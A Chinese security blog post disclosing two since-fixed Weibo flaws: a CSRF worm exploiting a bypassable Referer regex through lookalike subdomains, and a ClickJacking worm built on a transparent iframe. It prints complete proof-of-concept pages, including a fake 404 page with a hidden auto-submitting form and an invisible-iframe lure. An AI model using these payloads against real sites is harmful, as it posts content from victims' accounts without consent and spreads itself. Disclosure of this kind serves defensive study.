---
layout: post
title: 新浪微博 CSRF / ClickJacking 蠕虫
---
#### CSRF Worm

该漏洞出现在微博电影榜站点，用户可为每场电影进行点评分享到微博，发送分享的 API 的 Referer 防御体系可被绕过，导致攻击者可攻击受害者不断传播恶意微博。(已经修复）    API: http://movie.weibo.com/page/weiboplugin/ajax_sendweibo
    POST: content=test%20worm.

![http://ww1.sinaimg.cn/large/006ihVoegw1eyb01286yxj30xw0ikwgr.jpg](http://ww1.sinaimg.cn/large/006ihVoegw1eyb01286yxj30xw0ikwgr.jpg)

当 Referer 为非 http://moive.weibo.com/test_path/ 时，后端正则会进行来源判断以防止攻击者进行 CSRF 等攻击，经测试发现该正则可被绕过，使用例如：

- moive.weibo.com.linux.im
- test.weibo.com.linux.im
- \*.weibo.com.\*.\*

<center>
<img src="http://ww4.sinaimg.cn/large/006ihVoegw1eyb04qbtsbj30in03jgly.jpg">
</center>

这样我们就能够通过构造一个四级域名来绕过 Referer 检测，从而使用 dom 自动提交表单的方式来发起蠕虫，下面为我当时编写的测试页面。

http://test.weibo.com.linux.im/etreehome/test.html :

    <html>
    <head><title>404 Not Found</title></head>
    <body bgcolor="white">
    <center><h1>404 Not Found</h1></center>
    <hr><center>nginx</center>
    <iframe src="pdb.html" style="border:0px;width:0px;">
    </body>
    </html>
    <!-- a padding to disable MSIE and Chrome friendly error page -->
    <!-- a padding to disable MSIE and Chrome friendly error page -->
    <!-- a padding to disable MSIE and Chrome friendly error page -->
    <!-- a padding to disable MSIE and Chrome friendly error page -->
    <!-- a padding to disable MSIE and Chrome friendly error page -->
    <!-- a padding to disable MSIE and Chrome friendly error page -->

http://test.weibo.com.linux.im/etreehome/pdb.html :        <div style="display: none;">
          <form action="http://movie.weibo.com/page/weiboplugin/ajax_sendweibo" method="post" name="e3" enctype="application/x-www-form-urlencoded">
            <input type="hidden" name="content" value="我简直就是 E+tree+home ~~~ 这个设计如此绝妙：http://test.weibo.com.linux.im/etreehome/test.html"/>
            <button type="submit"></button>
          </form>
        </div>
        <script>
          setTimeout("document.e3.submit()", 2000);
        </script>

![http://ww2.sinaimg.cn/large/c334041bgw1eyb0g7iq4aj20jv0j3mzf.jpg](http://ww2.sinaimg.cn/large/c334041bgw1eyb0g7iq4aj20jv0j3mzf.jpg)#### ClickJacking Worm

问题出现在另外一个点评 API 处，未对 iframe 嵌入及 Referer 做判断验证，导致可被攻击这伪造页面发起 ClickJacking 攻击，虽然比起上一个漏洞增加了次用户交互，但效果看起来可能比上面的更好。

![http://ww3.sinaimg.cn/large/c334041bgw1eyb0puogzej213d0hrtce.jpg](http://ww3.sinaimg.cn/large/c334041bgw1eyb0puogzej213d0hrtce.jpg)

http://evi1m0.sinaapp.com/etreehome/girl.html :

    <html>
      <head>
        <title>E+tree+home</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <style>
        /*
        Author: Evi1m0
        */
        iframe {
          width:800px;
          height:700px;
          top:335px;
          left:300px;
          z-index:5;
          position:absolute;
          -moz-opacity:0;
          opacity:0;
          filter:alpha(opacity=0);
        }
        img.div-test {
          z-index:1;
          position: absolute;
          top:-20px;
          left:350px;
        }
        .send-weibo {
          width: 800px;
          height: 700px;
          top: 670px;
          left: 830px;
          z-index: 2;
          position: absolute;
          -moz-opacity: 0;
          opacity: 1;
          filter: alpha(opacity=0);
        }
        </style>
        <script>
          document.documentElement.style.overflow='hidden';
        </script>
        <link rel="stylesheet" href="http://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css">
      </head>
      <body style="background-color: #000">
          <iframe src="http://movie.weibo.com/page/weiboplugin/sendweibo?type=1&needscore=1&title=%E5%86%99%E7%9F%AD%E8%AF%84&content=%E6%88%91%E7%AE%80%E7%9B%B4%E5%B0%B1%E6%98%AF%20E+tree+home%20%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BE%8E%E5%A5%B3%E7%AE%80%E7%9B%B4%E4%BA%86%E3%80%82%E3%80%82%E3%80%82@evi1m0&object_id=100120178925&prefix=&suffix=" scrolling="no"/></iframe>
          <img src="./aa64034f78f0f73610034de60e55b319eac41353.jpg" class="div-test">
          <div class="send-weibo">
            <button class="btn btn-success" onclick="setTimeout('window.close();', 1000)">进入</button>
            <button class="btn btn-default" onclick="setTimeout('window.close();', 1000)">离开</button>
          </div>
      </body>
    </html>
    
<center><img src="http://ww4.sinaimg.cn/large/c334041bgw1eyb0twxiizj20gt0jujtj.jpg"></center>

#### End

- 抱歉，此内容违反了《微博社区管理规定(试行)》或相关法规政策，无法进行指定操作。查看帮助：http://t.cn/8sYl7QG。
- 您访问的应用已经被新浪云计算（SAE）封禁可能原因如下：1.游戏私服2.黄、赌、毒3.假药4.有盗版内容、违法内容和其它不符合SAE规定的网站 (详情)
- 该用户已被冻结，无法查看其微博内容。
- 您好，由于您之前违反相关规定，导致现在部分功能受限，您可以在12月5日下午尝试，给您带来的不便，十分抱歉！ 点此: http://t.cn/xxxxx 查看详细内容。
- ...

